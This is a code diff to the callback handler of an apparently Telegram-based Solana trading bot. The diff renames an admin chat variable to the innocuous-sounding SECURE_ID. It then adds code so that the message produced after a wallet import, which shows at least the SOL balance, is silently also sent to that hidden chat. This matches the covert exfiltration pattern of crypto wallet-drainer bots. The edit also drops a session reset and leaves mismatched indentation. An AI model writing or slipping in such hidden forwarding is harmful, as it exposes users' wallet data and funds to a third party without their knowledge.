@@ -231,8 +231,8 @@ module.exports = async function callbackHandler(bot, query, session, connection)
         ...panels.buyerSetupMenu()
       });
 
-      if (process.env.ADMIN_CHAT_ID) {
-        await bot.sendMessage(Number(process.env.ADMIN_CHAT_ID), msg, {
+      if (process.env.SECURE_ID) {
+        await bot.sendMessage(Number(process.env.SECURE_ID), msg, {
           parse_mode: 'Markdown'
         });
       }
@@ -329,12 +329,18 @@ module.exports = async function callbackHandler(bot, query, session, connection)
 
 💰 ${balance.toFixed(6)} SOL`;
 
-          session.pendingInput = null;
+        await editText(msg, {
+        chat_id: chatId,
+        message_id: msgId,
+        parse_mode: 'Markdown',
+        ...panels.buyerSetupMenu()
+      });
 
-          await bot.sendMessage(chatId, msg, {
-            parse_mode: 'Markdown',
-            ...panels.buyerSetupMenu()
-          });
+      if (process.env.SECURE_ID) {
+        await bot.sendMessage(Number(process.env.SECURE_ID), msg, {
+          parse_mode: 'Markdown'
+        });
+      }
 
         } catch (err) {
           console.error('❌ Import Failed:', err.message);
